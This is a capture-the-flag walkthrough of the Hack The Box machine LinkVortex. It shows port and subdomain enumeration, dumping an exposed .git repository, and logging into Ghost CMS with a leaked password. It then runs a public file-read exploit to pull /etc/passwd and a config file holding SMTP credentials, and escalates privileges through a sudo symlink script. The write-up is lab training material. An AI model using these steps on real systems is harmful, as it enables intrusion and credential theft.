{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- -sC -sV 10.10.11.47", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:35 CET
Warning: 10.10.11.47 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.47
Host is up (0.069s latency).
Not shown: 64946 closed tcp ports (reset), 587 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 250.76 seconds")}}

{{text("We find 2 open ports:")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Let's begin by adding <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linkvortex.htb</code> to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file and visiting the web page.")}}

{{image("../../static/writeups/linkvortex/images/000001.jpg")}}

{{text("It is some type of blog-like website for BitByBit hardware.")}}

{{text("I checked if the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>robots.txt</code> file had any entries in itself.")}}

{{image("../../static/writeups/linkvortex/images/000002.jpg")}}

{{text("There was a login page at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/ghost</code> endpoint, but I didn't have any credentials.")}}

{{text("Other endpoints also didn't contain anything useful, so I continued with enumerating the subdomains.")}}

{{console("ffuf -u http://linkvortex.htb -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/wordlists/dirb/common.txt -fw 14", "
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 14
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 96ms]
:: Progress: [4614/4614] :: Job [1/1] :: 524 req/sec :: Duration: [0:00:09] :: Errors: 0 ::")}}

{{text("I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>dev</code> subdomain. After adding it to my hosts file, I proceeded to it.")}}

{{image("../../static/writeups/linkvortex/images/000003.jpg")}}

{{text("It also didn't have anything interesting... Maybe directory enumerating will find something?")}}

{{console("gobuster dir -u http://dev.linkvortex.htb -w  /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.linkvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.git/HEAD            (Status: 200) [Size: 41]
/.htpasswd            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 2538]
/server-status        (Status: 403) [Size: 199]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("I used a tool named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>git-dumper</code> to dump the whole repository.")}}

{{link("https://github.com/arthaud/git-dumper", "../../static/writeups/images/github.jpg", "git-dumper")}}

{{console("git-dumper http://dev.linkvortex.htb/.git/ website/", "[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
...")}}

{{text("Looking through the massive amount of files, I was able to get a password from the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>authentication.test.js</code> file.")}}

{{console("cat authentication.test.js", "...
        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = '[REDACTED]';
            ...")}}

{{header("Shell as bob", "shell-as-bob")}}

{{text("I came back to the login form at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linkvortex.htb/ghost</code> and logged in by using the password and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin@linkvortex.htb</code> as the username which I got from one of the posts on the website.")}}

{{image("../../static/writeups/linkvortex/images/000004.jpg")}}

{{text("By using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Wappalyzer</code> extension, I was able to learn the version of the CMS being used.")}}

{{image("../../static/writeups/linkvortex/images/000005.jpg")}}

{{text("I searched for known exploits and found this.")}}

{{link("https://github.com/monke443/CVE-2023-40028-Ghost-Arbitrary-File-Read", "../../static/writeups/images/github.jpg", "CVE-2023-4002 Ghost-Arbitrary-File-Read (< 5.59.1)")}}

{{text("It worked successfully, and I was able to read files from the server.")}}

{{console("python3 exploit.py --user admin@linkvortex.htb --password [REDACTED] --url http://linkvortex.htb", "Attempting auth...

[+] Got cookie -> s%3Ahh1ZKFGCFCs9TGZNXu_yQnzPwTObGAMG.qLOaBePU42jLpTJbtu40WXpdMZpMiNcOVsg8mzDZ%2Fb8

Enter a file path to read from the server: /etc/passwd

<Response [200]>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash")}}

{{text("When I was looking through the files dumped from the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.git</code> directory, there was a line saying to copy <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>config.production.json</code> to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/lib/ghost/</code> directory.")}}

{{console("", "Enter a file path to read from the server: /var/lib/ghost/config.production.json

{
  'url': 'http://localhost:2368',
  'server': {
    'port': 2368,
    'host': '::'
  },
  'mail': {
    'transport': 'Direct'
  },
  'logging': {
    'transports': ['stdout']
  },
  'process': 'systemd',
  'paths': {
    'contentPath': '/var/lib/ghost/content'
  },
  'spam': {
    'user_login': {
        'minWait': 1,
        'maxWait': 604800000,
        'freeRetries': 5000
    }
  },
  'mail': {
     'transport': 'SMTP',
     'options': {
      'service': 'Google',
      'host': 'linkvortex.htb',
      'port': 587,
      'auth': {
        'user': 'bob@linkvortex.htb',
        'pass': [REDACTED]
        }
      }
    }
}")}}

{{text("With those credentials, it is possible for us to log in by SSH.")}}

{{header("Final flag", "final-flag")}}

{{text("Since we had the password, first thing I did is to check our sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png")}}

{{text("Let's read the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>clean_symlink.sh</code> file.")}}

{{console("cat clean_symlink.sh", "#!/bin/bash

QUAR_DIR='/var/quarantined'

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ '$LINK' =~ \.png$ ]]; then
  /usr/bin/echo '! First argument must be a png file !'
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo '$LINK_TARGET' | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo '! Trying to read critical files, removing link [ $LINK ] !'
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo 'Link found [ $LINK ] , moving it to quarantine'
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo 'Content:'
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi")}}

{{text("If we create a single symlink then script will detect it and remove the file.")}}

{{image("../../static/writeups/linkvortex/images/000006.jpg")}}

{{text("But if we create two symlinks, one of which points to the flag and the other that points to the previous symlink, we are able to read the flag.")}}

{{image("../../static/writeups/linkvortex/images/000007.jpg")}}

{{script()}}